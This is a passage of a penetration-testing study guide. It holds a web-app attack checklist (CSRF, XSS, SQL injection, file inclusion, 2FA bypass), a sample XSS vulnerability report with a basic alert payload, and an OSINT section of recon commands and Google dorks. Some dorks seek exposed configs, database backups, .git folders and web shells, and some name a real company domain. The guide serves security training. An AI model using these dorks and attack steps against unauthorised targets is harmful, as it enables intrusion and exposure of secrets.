<li><input disabled="" type="checkbox"/>
Test for GET and POST vulnerabilities</li>
<li><input disabled="" type="checkbox"/>
Test if GET request incorporating the session ID used</li>
<li><input disabled="" type="checkbox"/>
Test by interchanging POST with GET method</li>
</ul>
<p><strong>Test For Back Refresh Attack</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Test after password change</li>
<li><input disabled="" type="checkbox"/>
Test after logout</li>
</ul>
<p><strong>Test For Cross Site Request Forgery</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Check if the token is validated on the server-side or not</li>
<li><input disabled="" type="checkbox"/>
Check if the token is validated for full or partial length</li>
<li><input disabled="" type="checkbox"/>
Check by comparing the CSRF tokens for multiple dummy accounts</li>
<li><input disabled="" type="checkbox"/>
Check CSRF by interchanging POST with GET method</li>
<li><input disabled="" type="checkbox"/>
Check CSRF by removing the CSRF token parameter</li>
<li><input disabled="" type="checkbox"/>
Check CSRF by removing the CSRF token and using a blank parameter</li>
<li><input disabled="" type="checkbox"/>
Check CSRF by using unused tokens</li>
<li><input disabled="" type="checkbox"/>
Check CSRF by replacing the CSRF token with its own values</li>
<li><input disabled="" type="checkbox"/>
Check CSRF by changing the content type to form-multipart</li>
<li><input disabled="" type="checkbox"/>
Check CSRF by changing or deleting some characters of the CSRF token</li>
<li><input disabled="" type="checkbox"/>
Check CSRF by changing the referrer to Referrer</li>
<li><input disabled="" type="checkbox"/>
Check CSRF by changing the host values</li>
<li><input disabled="" type="checkbox"/>
Check CSRF alongside clickjacking</li>
</ul>
<p><strong>Test For Logout Functionality</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Check the log out function on different pages</li>
<li><input disabled="" type="checkbox"/>
Check for the visibility of the logout button</li>
<li><input disabled="" type="checkbox"/>
Ensure after logout the session was ended</li>
<li><input disabled="" type="checkbox"/>
Ensure after logout we can’t able to access the dashboard by pressing the back button</li>
<li><input disabled="" type="checkbox"/>
Ensure proper session timeout has been set</li>
</ul>
<p><strong>Test For Session Timeout</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Ensure there is a session timeout exists</li>
<li><input disabled="" type="checkbox"/>
Ensure after the timeout, all of the tokens are destroyed</li>
</ul>
<p><strong>Test For Session Puzzling</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Identify all the session variables</li>
<li><input disabled="" type="checkbox"/>
Try to break the logical flow of the session generation</li>
</ul>
<p><strong>Test For Session Hijacking</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Test session hijacking on target that doesn’t has HSTS enabled</li>
<li><input disabled="" type="checkbox"/>
Test by login with the help of captured cookies</li>
</ul>
</li>
<li>
<p><strong>INPUT VALIDATION TESTING</strong></p>
<p><strong>Test For Reflected Cross Site Scripting</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Ensure these characters are filtered &lt;&gt;’’&amp;””</li>
<li><input disabled="" type="checkbox"/>
Test with a character escape sequence</li>
<li><input disabled="" type="checkbox"/>
Test by replacing &lt; and &gt; with HTML entities &lt; and &gt;</li>
<li><input disabled="" type="checkbox"/>
Test payload with both lower and upper case</li>
<li><input disabled="" type="checkbox"/>
Test to break firewall regex by new line /r/n</li>
<li><input disabled="" type="checkbox"/>
Test with double encoding</li>
<li><input disabled="" type="checkbox"/>
Test with recursive filters</li>
<li><input disabled="" type="checkbox"/>
Test injecting anchor tags without whitespace</li>
<li><input disabled="" type="checkbox"/>
Test by replacing whitespace with bullets</li>
<li><input disabled="" type="checkbox"/>
Test by changing HTTP methods</li>
</ul>
<p><strong>Test For Stored Cross Site Scripting</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Identify stored input parameters that will reflect on the client-side</li>
<li><input disabled="" type="checkbox"/>
Look for input parameters on the profile page</li>
<li><input disabled="" type="checkbox"/>
Look for input parameters on the shopping cart page</li>
<li><input disabled="" type="checkbox"/>
Look for input parameters on the file upload page</li>
<li><input disabled="" type="checkbox"/>
Look for input parameters on the settings page</li>
<li><input disabled="" type="checkbox"/>
Look for input parameters on the forum, comment page</li>
<li><input disabled="" type="checkbox"/>
Test uploading a file with XSS payload as its file name</li>
<li><input disabled="" type="checkbox"/>
Test with HTML tags</li>
</ul>
<p><strong>Test For HTTP Parameter Pollution</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Identify the backend server and parsing method used</li>
<li><input disabled="" type="checkbox"/>
Try to access the injection point</li>
<li><input disabled="" type="checkbox"/>
Try to bypass the input filters using HTTP Parameter Pollution</li>
</ul>
<p><strong>Test For SQL Injection</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Test SQL Injection on authentication forms</li>
<li><input disabled="" type="checkbox"/>
Test SQL Injection on the search bar</li>
<li><input disabled="" type="checkbox"/>
Test SQL Injection on editable characteristics</li>
<li><input disabled="" type="checkbox"/>
Try to find SQL keywords or entry point detections</li>
<li><input disabled="" type="checkbox"/>
Try to inject SQL queries</li>
<li><input disabled="" type="checkbox"/>
Use tools like SQLmap or Hackbar</li>
<li><input disabled="" type="checkbox"/>
Use Google dorks to find the SQL keywords</li>
<li><input disabled="" type="checkbox"/>
Try GET based SQL Injection</li>
<li><input disabled="" type="checkbox"/>
Try POST based SQL Injection</li>
<li><input disabled="" type="checkbox"/>
Try COOKIE based SQL Injection</li>
<li><input disabled="" type="checkbox"/>
Try HEADER based SQL Injection</li>
<li><input disabled="" type="checkbox"/>
Try SQL Injection with null bytes before the SQL query</li>
<li><input disabled="" type="checkbox"/>
Try SQL Injection with URL encoding</li>
<li><input disabled="" type="checkbox"/>
Try SQL Injection with both lower and upper cases</li>
<li><input disabled="" type="checkbox"/>
Try SQL Injection with SQL Tamper scripts</li>
<li><input disabled="" type="checkbox"/>
Try SQL Injection with SQL Time delay payloads</li>
<li><input disabled="" type="checkbox"/>
Try SQL Injection with SQL Conditional delays</li>
<li><input disabled="" type="checkbox"/>
Try SQL Injection with Boolean based SQL</li>
<li><input disabled="" type="checkbox"/>
Try SQL Injection with Time based SQL</li>
</ul>
<p><strong>Test For LDAP Injection</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Use LDAP search filters</li>
<li><input disabled="" type="checkbox"/>
Try LDAP Injection for access control bypass</li>
</ul>
<p><strong>Testing For XML Injection</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Check if the application is using XML for processing</li>
<li><input disabled="" type="checkbox"/>
Identify the XML Injection point by XML metacharacter</li>
<li><input disabled="" type="checkbox"/>
Construct XSS payload on top of XML</li>
</ul>
<p><strong>Test For Server Side Includes</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Use Google dorks to find the SSI</li>
<li><input disabled="" type="checkbox"/>
Construct RCE on top of SSI</li>
<li><input disabled="" type="checkbox"/>
Construct other injections on top of SSI</li>
<li><input disabled="" type="checkbox"/>
Test Injecting SSI on login pages, header fields, referrer, etc</li>
</ul>
<p><strong>Test For XPATH Injection</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Identify XPATH Injection point</li>
<li><input disabled="" type="checkbox"/>
Test for XPATH Injection</li>
</ul>
<p><strong>Test For IMAP SMTP Injection</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Identify IMAP SMTP Injection point</li>
<li><input disabled="" type="checkbox"/>
Understand the data flow</li>
<li><input disabled="" type="checkbox"/>
Understand the deployment structure of the system</li>
<li><input disabled="" type="checkbox"/>
Assess the injection impact</li>
</ul>
<p><strong>Test For Local File Inclusion</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Look for LFI keywords</li>
<li><input disabled="" type="checkbox"/>
Try to change the local path</li>
<li><input disabled="" type="checkbox"/>
Use the LFI payload list</li>
<li><input disabled="" type="checkbox"/>
Test LFI by adding a null byte at the end</li>
</ul>
<p><strong>Test For Remote File Inclusion</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Look for RFI keywords</li>
<li><input disabled="" type="checkbox"/>
Try to change the remote path</li>
<li><input disabled="" type="checkbox"/>
Use the RFI payload list</li>
</ul>
<p><strong>Test For Command Injection</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Identify the Injection points</li>
<li><input disabled="" type="checkbox"/>
Look for Command Injection keywords</li>
<li><input disabled="" type="checkbox"/>
Test Command Injection using different delimiters</li>
<li><input disabled="" type="checkbox"/>
Test Command Injection with payload list</li>
<li><input disabled="" type="checkbox"/>
Test Command Injection with different OS commands</li>
</ul>
<p><strong>Test For Format String Injection</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Identify the Injection points</li>
<li><input disabled="" type="checkbox"/>
Use different format parameters as payloads</li>
<li><input disabled="" type="checkbox"/>
Assess the injection impact</li>
</ul>
<p><strong>Test For Host Header Injection</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Test for HHI by changing the real Host parameter</li>
<li><input disabled="" type="checkbox"/>
Test for HHI by adding X-Forwarded Host parameter</li>
<li><input disabled="" type="checkbox"/>
Test for HHI by swapping the real Host and X-Forwarded Host parameter</li>
<li><input disabled="" type="checkbox"/>
Test for HHI by adding two Host parameters</li>
<li><input disabled="" type="checkbox"/>
Test for HHI by adding the target values in front of the original values</li>
<li><input disabled="" type="checkbox"/>
Test for HHI by adding the target with a slash after the original values</li>
<li><input disabled="" type="checkbox"/>
Test for HHI with other injections on the Host parameter</li>
<li><input disabled="" type="checkbox"/>
Test for HHI by password reset poisoning</li>
</ul>
<p><strong>Test For Server Side Request Forgery</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Look for SSRF keywords</li>
<li><input disabled="" type="checkbox"/>
Search for SSRF keywords only under the request header and body</li>
<li><input disabled="" type="checkbox"/>
Identify the Injection points</li>
<li><input disabled="" type="checkbox"/>
Test if the Injection points are exploitable</li>
<li><input disabled="" type="checkbox"/>
Assess the injection impact</li>
</ul>
<p><strong>Test For Server Side Template Injection</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Identify the Template injection vulnerability points</li>
<li><input disabled="" type="checkbox"/>
Identify the Templating engine</li>
<li><input disabled="" type="checkbox"/>
Use the tplmap to exploit</li>
</ul>
</li>
<li>
<p><strong>ERROR HANDLING TESTING</strong></p>
<p><strong>Test For Improper Error Handling</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Identify the error output</li>
<li><input disabled="" type="checkbox"/>
Analyze the different outputs returned</li>
<li><input disabled="" type="checkbox"/>
Look for common error handling flaws</li>
<li><input disabled="" type="checkbox"/>
Test error handling by modifying the URL parameter</li>
<li><input disabled="" type="checkbox"/>
Test error handling by uploading unrecognized file formats</li>
<li><input disabled="" type="checkbox"/>
Test error handling by entering unrecognized inputs</li>
<li><input disabled="" type="checkbox"/>
Test error handling by making all possible errors</li>
</ul>
</li>
<li>
<p><strong>WEAK CRYPTOGRAPHY TESTING</strong></p>
<p><strong>Test For Weak Transport Layer Security</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Test for DROWN weakness on SSLv2 protocol</li>
<li><input disabled="" type="checkbox"/>
Test for POODLE weakness on SSLv3 protocol</li>
<li><input disabled="" type="checkbox"/>
Test for BEAST weakness on TLSv1.0 protocol</li>
<li><input disabled="" type="checkbox"/>
Test for FREAK weakness on export cipher suites</li>
<li><input disabled="" type="checkbox"/>
Test for Null ciphers</li>
<li><input disabled="" type="checkbox"/>
Test for NOMORE weakness on RC4</li>
<li><input disabled="" type="checkbox"/>
Test for LUCKY 13 weakness on CBC mode ciphers</li>
<li><input disabled="" type="checkbox"/>
Test for CRIME weakness on TLS compression</li>
<li><input disabled="" type="checkbox"/>
Test for LOGJAM on DHE keys</li>
<li><input disabled="" type="checkbox"/>
Ensure the digital certificates should have at least 2048 bits of key length</li>
<li><input disabled="" type="checkbox"/>
Ensure the digital certificates should have at least SHA-256 signature algorithm</li>
<li><input disabled="" type="checkbox"/>
Ensure the digital certificates should not use MDF and SHA-1</li>
<li><input disabled="" type="checkbox"/>
Ensure the validity of the digital certificate</li>
<li><input disabled="" type="checkbox"/>
Ensure the minimum key length requirements</li>
<li><input disabled="" type="checkbox"/>
Look for weak cipher suites</li>
</ul>
</li>
<li>
<p><strong>BUSINESS LOGIC TESTING</strong></p>
<p><strong>Test For Business Logic</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Identify the logic of how the application works</li>
<li><input disabled="" type="checkbox"/>
Identify the functionality of all the buttons</li>
<li><input disabled="" type="checkbox"/>
Test by changing the numerical values into high or negative values</li>
<li><input disabled="" type="checkbox"/>
Test by changing the quantity</li>
<li><input disabled="" type="checkbox"/>
Test by modifying the payments</li>
<li><input disabled="" type="checkbox"/>
Test for parameter tampering</li>
</ul>
<p><strong>Test For Malicious File Upload</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Test malicious file upload by uploading malicious files</li>
<li><input disabled="" type="checkbox"/>
Test malicious file upload by putting your IP address on the file name</li>
<li><input disabled="" type="checkbox"/>
Test malicious file upload by right to left override</li>
<li><input disabled="" type="checkbox"/>
Test malicious file upload by encoded file name</li>
<li><input disabled="" type="checkbox"/>
Test malicious file upload by XSS payload on the file name</li>
<li><input disabled="" type="checkbox"/>
Test malicious file upload by RCE payload on the file name</li>
<li><input disabled="" type="checkbox"/>
Test malicious file upload by LFI payload on the file name</li>
<li><input disabled="" type="checkbox"/>
Test malicious file upload by RFI payload on the file name</li>
<li><input disabled="" type="checkbox"/>
Test malicious file upload by SQL payload on the file name</li>
<li><input disabled="" type="checkbox"/>
Test malicious file upload by other injections on the file name</li>
<li><input disabled="" type="checkbox"/>
Test malicious file upload by Inserting the payload inside of an image by the bmp.pl tool</li>
<li><input disabled="" type="checkbox"/>
Test malicious file upload by uploading large files (leads to DOS)</li>
</ul>
</li>
<li>
<p><strong>CLIENT SIDE TESTING</strong></p>
<p><strong>Test For DOM Based Cross Site Scripting</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Try to identify DOM sinks</li>
<li><input disabled="" type="checkbox"/>
Build payloads to that DOM sink type</li>
</ul>
<p><strong>Test For URL Redirect</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Look for URL redirect parameters</li>
<li><input disabled="" type="checkbox"/>
Test for URL redirection on domain parameters</li>
<li><input disabled="" type="checkbox"/>
Test for URL redirection by using a payload list</li>
<li><input disabled="" type="checkbox"/>
Test for URL redirection by using a whitelisted word at the end</li>
<li><input disabled="" type="checkbox"/>
Test for URL redirection by creating a new subdomain with the same as the target</li>
<li><input disabled="" type="checkbox"/>
Test for URL redirection by XSS</li>
<li><input disabled="" type="checkbox"/>
Test for URL redirection by profile URL flaw</li>
</ul>
<p><strong>Test For Cross Origin Resource Sharing</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Look for “Access-Control-Allow-Origin” on the response</li>
<li><input disabled="" type="checkbox"/>
Use the CORS HTML exploit code for further exploitation</li>
</ul>
<p><strong>Test For Clickjacking</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Ensure “X-Frame-Options” headers are enabled</li>
<li><input disabled="" type="checkbox"/>
Exploit with iframe HTML code for POC</li>
</ul>
</li>
<li>
<p><strong>OTHER COMMON ISSUES</strong></p>
<p><strong>Test For No-Rate Limiting</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Ensure rate limiting is enabled</li>
<li><input disabled="" type="checkbox"/>
Try to bypass rate limiting by changing the case of the endpoints</li>
<li><input disabled="" type="checkbox"/>
Try to bypass rate limiting by adding / at the end of the URL</li>
<li><input disabled="" type="checkbox"/>
Try to bypass rate limiting by adding HTTP headers</li>
<li><input disabled="" type="checkbox"/>
Try to bypass rate limiting by adding HTTP headers twice</li>
<li><input disabled="" type="checkbox"/>
Try to bypass rate limiting by adding Origin headers</li>
<li><input disabled="" type="checkbox"/>
Try to bypass rate limiting by IP rotation</li>
<li><input disabled="" type="checkbox"/>
Try to bypass rate limiting by using null bytes at the end</li>
<li><input disabled="" type="checkbox"/>
Try to bypass rate limiting by using race conditions</li>
</ul>
<p><strong>Test For EXIF Geodata</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Ensure the website is striping the geodata</li>
<li><input disabled="" type="checkbox"/>
Test with EXIF checker</li>
</ul>
<p><strong>Test For Broken Link Hijack</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Ensure there is no broken links are there</li>
<li><input disabled="" type="checkbox"/>
Test broken links by using the blc tool</li>
</ul>
<p><strong>Test For SPF</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Ensure the website is having SPF record</li>
<li><input disabled="" type="checkbox"/>
Test SPF by nslookup command</li>
</ul>
<p><strong>Test For Weak 2FA</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Try to bypass 2FA by using poor session management</li>
<li><input disabled="" type="checkbox"/>
Try to bypass 2FA via the OAuth mechanism</li>
<li><input disabled="" type="checkbox"/>
Try to bypass 2FA via brute-forcing</li>
<li><input disabled="" type="checkbox"/>
Try to bypass 2FA via response manipulation</li>
<li><input disabled="" type="checkbox"/>
Try to bypass 2FA by using activation links to login</li>
<li><input disabled="" type="checkbox"/>
Try to bypass 2FA by using status code manipulation</li>
<li><input disabled="" type="checkbox"/>
Try to bypass 2FA by changing the email or password</li>
<li><input disabled="" type="checkbox"/>
Try to bypass 2FA by using a null or empty entry</li>
<li><input disabled="" type="checkbox"/>
Try to bypass 2FA by changing the boolean into false</li>
<li><input disabled="" type="checkbox"/>
Try to bypass 2FA by removing the 2FA parameter on the request</li>
</ul>
<p><strong>Test For Weak OTP Implementation</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Try to bypass OTP by entering the old OTP</li>
<li><input disabled="" type="checkbox"/>
Try to bypass OTP by brute-forcing</li>
<li><input disabled="" type="checkbox"/>
Try to bypass OTP by using a null or empty entry</li>
<li><input disabled="" type="checkbox"/>
Try to bypass OTP by response manipulation</li>
<li><input disabled="" type="checkbox"/>
Try to bypass OTP by status code manipulation</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="things-to-mention-in-the-report"><a class="header" href="#things-to-mention-in-the-report">Things to mention in the report:</a></h1>
<ol>
<li>
<p>Vulnerability</p>
</li>
<li>
<p>Severity</p>
</li>
<li>
<p>Description</p>
</li>
<li>
<p>Instance</p>
</li>
<li>
<p>POC (proof of concept)</p>
</li>
<li>
<p>Steps to Reproduce</p>
</li>
<li>
<p>Impact</p>
</li>
<li>
<p>Mitigation</p>
</li>
<li>
<p>Reference</p>
</li>
</ol>
<hr />
<pre><code>                               # Vulnerability Report
</code></pre>
<h2 id="vulnerability-cross-site-scripting-xss"><a class="header" href="#vulnerability-cross-site-scripting-xss">Vulnerability: Cross-Site Scripting (XSS)</a></h2>
<p><strong>Severity:</strong> High</p>
<h3 id="description"><a class="header" href="#description">Description</a></h3>
<p>Cross-site scripting is a critical computer security vulnerability where an attacker attempts to execute malicious scripts in a web browser of the victim by injecting malicious code into a legitimate web page or web application.</p>
<h3 id="instance"><a class="header" href="#instance">Instance</a></h3>
<ul>
<li>
<p><strong>URL:</strong> <a href="Checklist/www.xyz.com/deb/search?query=">www.xyz.com/deb/search?query=</a></p>
</li>
<li>
<p><strong>Payload:</strong></p>
<pre><code class="language-html">&lt;script&gt; alert(1); &lt;/script&gt;

</code></pre>
</li>
</ul>
<h1 id="proof-of-concept"><a class="header" href="#proof-of-concept">Proof of Concept</a></h1>
<p>Screenshots of the browser page demonstrating the successful execution of the payload.</p>
<h1 id="steps-to-reproduce"><a class="header" href="#steps-to-reproduce">Steps to Reproduce</a></h1>
<ol>
<li>
<p>Go to www.xyz.com/deb/search?query=</p>
</li>
<li>
<p>Insert the payload in search box</p>
</li>
<li>
<p>Check the response</p>
</li>
</ol>
<h1 id="impact"><a class="header" href="#impact">Impact</a></h1>
<p>The XSS vulnerability poses a high risk, leading to potential:</p>
<ul>
<li>
<p>Open Redirection</p>
</li>
<li>
<p>Session Hijack</p>
</li>
<li>
<p>Phishing</p>
</li>
<li>
<p>Defacement</p>
</li>
<li>
<p>Cookie Stealing</p>
</li>
</ul>
<h3 id="mitigation"><a class="header" href="#mitigation"><span style="color:green">Mitigation</span></a></h3>
<ul>
<li>
<p>Input Validation</p>
</li>
<li>
<p>Encoding</p>
</li>
</ul>
<p>• Input Validation: Validate and sanitize user inputs to ensure they adhere to expected formats. </br>
• Encoding: Encode output data to prevent malicious script execution.</p>
<h1 id="reference"><a class="header" href="#reference">Reference</a></h1>
<p>OWASP/CVE/NVD link 🔗</p>
<p>Examples screenshot:</p>
<p><img src="https://github.com/masshuvo/full_ceh_guide/assets/108648096/3368e757-9cbd-4607-af6e-af627ee2885b" alt="Screenshot_2024-01-24-10-02-16-362_com google android youtube" />
<img src="https://github.com/masshuvo/full_ceh_guide/assets/108648096/dc85fcec-c8e5-439e-8456-11eb5e3f64a2" alt="Screenshot_2024-01-24-10-02-37-586_com google android youtube" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="public-info-gathering"><a class="header" href="#public-info-gathering">Public info gathering</a></h1>
<h2 id="osint-resources"><a class="header" href="#osint-resources">OSINT resources</a></h2>
<pre><code class="language-bash">https://osintframework.com/
https://i-intelligence.eu/uploads/public-documents/OSINT_Handbook_2020.pdf
https://start.me/p/DPYPMz/the-ultimate-osint-collection
https://docs.google.com/spreadsheets/d/18rtqh8EG2q1xBo2cLNyhIDuK9jrPGwYr9DI2UncoqJQ
https://cipher387.github.io/
</code></pre>
<h2 id="osint-websites"><a class="header" href="#osint-websites">OSINT websites</a></h2>
<pre><code class="language-bash"># Multipurpose
https://shodan.io/
https://censys.io/
https://onyphe.io/
https://app.netlas.io/
https://hunter.how/
https://fofa.so/
https://fullhunt.io/
https://www.zoomeye.org/
https://www.criminalip.io/
https://leakix.net/
https://www.yougetsignal.com/
https://intelx.io/
https://pentest-tools.com/
https://gofindwhois.com/
https://gofindwho.com/

# Track website changes
https://visualping.io/
https://web.archive.org

# Companies info
https://opencorporates.com/companies

# Domain Recon
https://www.robtex.com/
https://centralops.net
https://viewdns.info/
https://phpinfo.me/domain
http://bgp.he.net/
https://bgpview.io/
https://suip.biz/
https://dnsdumpster.com/
https://www.whoxy.com/
http://ipv4info.com/
https://rapiddns.io/
https://myip.ms/
https://www.reversewhois.io/?
https://www.whoxy.com/reverse-whois/
https://reverse-whois.whoisxmlapi.com/api
https://host.io/dashboard
https://completedns.com/dns-history/

# Analytics
https://mmhdan.herokuapp.com/
https://publicwww.com/
https://intelx.io/tools?tab=analytics
https://dnslytics.com/reverse-analytics
https://builtwith.com/

# Mailserver blacklists
http://multirbl.valli.org/

# Verify emails
https://tools.emailhippo.com/

# Dark web exposure
https://immuniweb.com/radar/

# New acquisitions
https://crunchbase.com/

# Public APIs
https://www.postman.com/explore/
https://rapidapi.com/

# APIs Recon
https://serene-agnesi-57a014.netlify.app/

# Exif Data 
https://exif-viewer.com

</code></pre>
<h2 id="general--aio"><a class="header" href="#general--aio">General / AIO</a></h2>
<pre><code class="language-bash"># https://github.com/OWASP/Amass
# Get ASN
amass intel -org "whatever"
# Reverse whois
amass intel -active -asn NUMBER -whois -d domain.com
# SSL Cert Grabbing
amass enum -active -d example.com -cidr IF.YOU.GOT.THIS/24 -asn NUMBER

# https://github.com/smicallef/spiderfoot
spiderfoot -s domain.com

# https://github.com/j3ssie/Osmedeus
python3 osmedeus.py -t example.com

# https://github.com/thewhiteh4t/FinalRecon
python3 finalrecon.py --full https://example.com

# https://github.com/laramies/theHarvester
theHarvester -d domain.com -b all

# https://github.com/lanmaster53/recon-ng
recon-ng
</code></pre>
<h2 id="whoisregistrant-tools"><a class="header" href="#whoisregistrant-tools">Whois/Registrant Tools</a></h2>
<pre><code class="language-bash"># https://github.com/jpf/domain-profiler
./profile target.com

# Standard whois tool
whois

# Whoxy api
# https://www.whoxy.com/
# Whoxy clients
# https://github.com/MilindPurswani/whoxyrm
# https://github.com/vysecurity/DomLink

# Registrant's domains related
# https://github.com/harleo/knockknock
knockknock -n "companyORregistrant" -p

# Bulk whois
# https://github.com/melbadry9/WhoEnum
</code></pre>
<h2 id="dorks"><a class="header" href="#dorks">Dorks</a></h2>
<pre><code>https://github.com/cipher387/Dorks-collections-list
</code></pre>
<h3 id="google"><a class="header" href="#google">Google</a></h3>
<h4 id="tools"><a class="header" href="#tools">Tools</a></h4>
<pre><code class="language-bash"># Google Dorks Cli
# https://github.com/six2dez/dorks_hunter
python3 dorks_hunter.py -d domain.com

# Google Dork builder
http://advangle.com/
</code></pre>
<h4 id="dorks-1"><a class="header" href="#dorks-1">Dorks</a></h4>
<pre><code class="language-bash"># Google dorks helper
https://dorks.faisalahmed.me/
# Ip search by dorking
https://0iq.me/gip/

# Code share sites
site:http://ideone.com | site:http://codebeautify.org | site:http://codeshare.io | site:http://codepen.io | site:http://repl.it | site:http://jsfiddle.net "company"
# GitLab/GitHub/Bitbucket
site:github.com | site:gitlab.com | site:bitbucket.org "company"
# Stackoverflow
site:stackoverflow.com "target.com"
# Project management sites
site:http://trello.com | site:*.atlassian.net "company"
# Pastebin-like sites
site:http://justpaste.it | site:http://pastebin.com "company"
# Config files
site:target.com ext:xml | ext:conf | ext:cnf | ext:reg | ext:inf | ext:rdp | ext:cfg | ext:txt | ext:ora | ext:env | ext:ini
# Database files
site:target.com ext:sql | ext:dbf | ext:mdb
# Backup files
site:target.com ext:bkf | ext:bkp | ext:bak | ext:old | ext:backup
# .git folder
inurl:"/.git" target.com -github
# Exposed documents
site:target.com ext:doc | ext:docx | ext:odt | ext:pdf | ext:rtf | ext:sxw | ext:psw | ext:ppt | ext:pptx | ext:pps | ext:csv
# Other files
site:target.com intitle:index.of | ext:log | ext:php intitle:phpinfo "published by the PHP Group" | inurl:shell | inurl:backdoor | inurl:wso | inurl:cmd | shadow | passwd | boot.ini | inurl:backdoor | inurl:readme | inurl:license | inurl:install | inurl:setup | inurl:config | inurl:"/phpinfo.php" | inurl:".htaccess" | ext:swf
# SQL errors
site:target.com intext:"sql syntax near" | intext:"syntax error has occurred" | intext:"incorrect syntax near" | intext:"unexpected end of SQL command" | intext:"Warning: mysql_connect()" | intext:"Warning: mysql_query()" | intext:"Warning: pg_connect()"
# PHP errors
site:target.com "PHP Parse error" | "PHP Warning" | "PHP Error"
# Login pages
site:target.com inurl:signup | inurl:register | intitle:Signup
# Open redirects
site:target.com inurl:redir | inurl:url | inurl:redirect | inurl:return | inurl:src=http | inurl:r=http
# Apache Struts RCE
site:target.com ext:action | ext:struts | ext:do
# Search in pastebin
site:pastebin.com target.com
# Linkedin employees
site:linkedin.com employees target.com
# Wordpress files
site:target.com inurl:wp-content | inurl:wp-includes
# Subdomains
site:*.target.com
# Sub-subdomains
site:*.*.target.com
#Find S3 Buckets
site:.s3.amazonaws.com | site:http://storage.googleapis.com | site:http://amazonaws.com "target"
# Traefik
intitle:traefik inurl:8080/dashboard "target"
# Jenkins
intitle:"Dashboard [Jenkins]"

# Other 3rd parties sites
https://www.google.com/search?q=site%3Agitter.im%20%7C%20site%3Apapaly.com%20%7C%20site%3Aproductforums.google.com%20%7C%20site%3Acoggle.it%20%7C%20site%3Areplt.it%20%7C%20site%3Aycombinator.com%20%7C%20site%3Alibraries.io%20%7C%20site%3Anpm.runkit.com%20%7C%20site%3Anpmjs.com%20%7C%20site%3Ascribd.com%20%22united%22
# Backup files
https://www.google.com/search?q=site%3Aunited.com%20ext%3Abkf%20%7C%20ext%3Abkp%20%7C%20ext%3Abak%20%7C%20ext%3Aold%20%7C%20ext%3Abackup
# Login pages
https://www.google.com/search?q=site%3Aunited.com%20inurl%3Asignup%20%7C%20inurl%3Aregister%20%7C%20intitle%3ASignup
# Config files
https://www.google.com/search?q=site%3Aunited.com%20ext%3Axml%20%7C%20ext%3Aconf%20%7C%20ext%3Acnf%20%7C%20ext%3Areg%20%7C%20ext%3Ainf%20%7C%20ext%3Ardp%20%7C%20ext%3Acfg%20%7C%20ext%3Atxt%20%7C%20ext%3Aora%20%7C%20ext%3Aenv%20%7C%20ext%3Aini
# .git folder
https://www.google.com/search?q=inurl%3A%5C%22%2F.git%5C%22%20united.com%20-github
# Database files
https://www.google.com/search?q=site%3Aunited.com%20ext%3Asql%20%7C%20ext%3Adbf%20%7C%20ext%3Amdb
# Open redirects
https://www.google.com/search?q=site%3Aunited.com%20inurl%3Aredir%20%7C%20inurl%3Aurl%20%7C%20inurl%3Aredirect%20%7C%20inurl%3Areturn%20%7C%20inurl%3Asrc%3Dhttp%20%7C%20inurl%3Ar%3Dhttp
# Code share sites
https://www.google.com/search?q=site%3Asharecode.io%20%7C%20site%3Acontrolc.com%20%7C%20site%3Acodepad.co%20%7Csite%3Aideone.com%20%7C%20site%3Acodebeautify.org%20%7C%20site%3Ajsdelivr.com%20%7C%20site%3Acodeshare.io%20%7C%20site%3Acodepen.io%20%7C%20site%3Arepl.it%20%7C%20site%3Ajsfiddle.net%20%22united%22
# Pastebin-like sites
https://www.google.com/search?q=site%3Ajustpaste.it%20%7C%20site%3Aheypasteit.com%20%7C%20site%3Apastebin.com%20%22united%22
# Linkedin employees
https://www.google.com/search?q=site%3Alinkedin.com%20employees%20united.com
# Project management sites
https://www.google.com/search?q=site%3Atrello.com%20%7C%20site%3A*.atlassian.net%20%22united%22
# Other files
